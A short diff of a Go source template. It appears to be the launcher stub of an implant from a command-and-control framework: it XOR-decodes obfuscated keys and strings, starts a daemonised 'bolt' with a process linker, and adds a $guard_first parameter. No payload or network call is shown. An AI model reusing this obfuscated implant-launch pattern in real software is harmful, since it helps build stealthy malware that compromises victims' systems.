@@ -50,7 +50,7 @@ func main() {
 	subtle.XorOp(z, k[:])
 	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
 	bolt.Daemon(
-		`$service`, $ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName(`$event`),
+		`$service`, $ignore || len(os.Args) > 2, $load, $critical, $guard_first, man.LinkerFromName(`$event`),
 		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
 	)
 }
@@ -63,7 +63,7 @@ func secondary() {
 	}
 	subtle.XorOp(z, k[:])
 	bolt.Start(
-		$ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName(`$event`),
+		$ignore || len(os.Args) > 2, $load, $critical, $guard_first, man.LinkerFromName(`$event`),
 		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
 	)
 }
